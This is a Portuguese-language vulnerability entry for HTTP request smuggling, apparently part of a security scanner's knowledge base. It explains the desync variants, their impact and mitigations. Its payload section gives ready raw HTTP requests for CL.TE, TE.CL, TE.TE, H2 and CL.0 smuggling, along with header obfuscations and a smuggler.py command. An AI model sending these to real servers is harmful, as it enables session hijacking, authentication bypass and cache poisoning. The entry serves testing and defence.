---
id: request_smuggling
title: "HTTP Request Smuggling"
module: "reqsmuggling"
severity: "CRITICAL"
cwe_id: "CWE-444"
cwe_title: "Inconsistent Interpretation of HTTP Requests ('HTTP Request Smuggling')"
cvss_vector: "AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H"
vrt_id: "server_security_misconfiguration.http_request_smuggling"
---

## Summary
Discordância entre proxy e backend na interpretação de `Content-Length` e `Transfer-Encoding` permite contrabandear requisições, sequestrar respostas, envenenar cache e bypassar autenticação.

## Description
Request smuggling explora parsers HTTP divergentes. O front-end (CDN/proxy) e o back-end podem interpretar de forma diferente headers ambíguos, fazendo com que parte de uma requisição seja tratada como o início da próxima. Variantes:

- **CL.TE:** front-end usa `Content-Length`, back-end usa `Transfer-Encoding: chunked`.
- **TE.CL:** front-end usa `Transfer-Encoding`, back-end usa `Content-Length`.
- **TE.TE:** ambos usam TE, mas um não reconhece a ofuscação e o outro sim.
- **H2.CL / H2.TE:** HTTP/2 converte headers para HTTP/1.1 e cria ambiguidade.
- **CL.0:** back-end ignora `Content-Length` e trata o body como próxima requisição.
- **Response queue poisoning:** o atacante faz a próxima resposta de outro usuário ser entregue a ele.
- **Cache poisoning:** requisição smuggled envenena o cache.

Consequências incluem bypass de autenticação, acesso a endpoints internos, roubo de sessão, XSS em cache e DoS.

## Impact
- Sequestro de requisições/respostas de outros usuários e roubo de sessão.
- Bypass de controles de acesso e WAF.
- Envenenamento de cache com conteúdo malicioso.
- Acesso a endpoints internos e administrativos.
- Negação de serviço e corrupção de filas.
- Impacto CRITICAL.

## Payloads and Bypasses
```http
# CL.TE
POST / HTTP/1.1
Host: alvo.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

```http
# TE.CL
POST / HTTP/1.1
Host: alvo.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

```http
# TE.TE com ofuscação
POST / HTTP/1.1
Host: alvo.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

Variações de ofuscação de `Transfer-Encoding`:
```text
Transfer-Encoding: chunked
Transfer-Encoding : chunked
Transfer-Encoding:\tchunked
Transfer-encoding: chunked
Transfer-Encoding: xchunked
Transfer-Encoding: chunked, identity
Transfer-Encoding: identity, chunked
Transfer-Encoding: chunked\r\nTransfer-Encoding: x
X: X
```

```http
# H2.CL / H2.TE (pseudo-headers)
:method: POST
:path: /
:authority: alvo.com
content-length: 0
transfer-encoding: chunked

0

SMUGGLED
```

```http
# CL.0
POST / HTTP/1.1
Host: alvo.com
Content-Length: 34

GET /admin HTTP/1.1
Host: alvo.com
```

Bypasses e testes:
```text
- Prefixos de proxy: /, //, /./, /%2e/
- Diferentes versões HTTP/1.0 e HTTP/1.1
- Headers duplicados e ordem
- Espaços/tabs antes dos dois-pontos
- Body com chunk extensions e trailers
- Requisições pipelined para detectar fila
- Timing e resposta divergente entre front/back
```

Ferramentas:
```bash
# Burp Suite: HTTP Request Smuggler
# smuggler.py
python3 smuggler.py -u https://alvo.com
```

Casos reais e mentalidade de ataque (RWBH): PayPal e Yahoo (proxies divergentes) ilustram fila envenenada e bypass de autenticação; o atacante testa CL.TE, TE.CL e ofuscações de `Transfer-Encoding` com cache busters.

## Target Context (Crawler Hints)
- **Parâmetros comuns:** headers `Content-Length`, `Transfer-Encoding`, `Connection`, `Host`, `X-Forwarded-*`; body POST.
- **Paths comuns:** qualquer endpoint atrás de proxy/CDN, especialmente `/`, `/login`, `/api/*`, `/graphql`, `/admin`.
- **Sinais:** respostas 400/501 inconsistentes; `Age`/`X-Cache`; proxy/backend diferentes; conexões keep-alive reutilizadas; comportamento divergente com TE ofuscado.

## Recommendation
1. Usar HTTP/2 de ponta a ponta e rejeitar downgrades ambíguos; se houver conversão H2→H1, normalizar headers.
2. Rejeitar requisições com `Content-Length` e `Transfer-Encoding` simultâneos, ou com TE duplicado/ofuscado.
3. Configurar proxy e backend com o mesmo parser e versão; nunca confiar em bibliotecas divergentes.
4. Desabilitar reuso de conexão entre usuários diferentes em caso de dúvida; usar conexões isoladas por request.
5. Aplicar limites de tamanho, timeout e número de chunks; rejeitar chunk extensions desconhecidas.
6. Atualizar CDN, proxy reverso, servidor web e framework; muitas variantes são corrigidas em versões recentes.
7. Bloquear métodos/headers anômalos no WAF como defesa em profundidade, sem depender dele.
8. Monitorar respostas 400/501, filas anormais e requisições com TE ofuscado; alertar sobre picos.
9. Exemplo Nginx:
```nginx
# Rejeitar TE + CL e TE duplicado
if ($http_transfer_encoding ~* "chunked") { set $te 1; }
if ($http_content_length != "") { set $cl 1; }
if ($te$cl = "11") { return 400; }
```
10. Validar a correção com testes de regressão usando Burp Smuggler e monitoramento de fila.
